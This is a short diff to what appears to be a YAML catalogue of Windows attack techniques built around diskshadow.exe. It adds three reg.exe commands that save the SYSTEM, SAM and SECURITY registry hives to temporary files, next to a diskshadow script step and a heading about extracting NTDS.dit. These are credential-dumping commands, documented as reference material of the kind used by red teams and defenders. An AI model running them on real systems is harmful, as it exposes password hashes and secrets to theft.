@@ -22,6 +22,10 @@ functions:
 
         Command: diskshadow.exe /s c:\unshadow.txt
 
+        reg.exe save hklm\system c:\windows\temp\sys.dat
+        reg.exe save hklm\sam c:\windows\temp\s.dat
+        reg.exe save hklm\security c:\windows\temp\c.dat
+
         REMINDER: If created on linux you will need to run unix2dos to convert the line returns
 
     - description: Break Out the NTDS.dit file
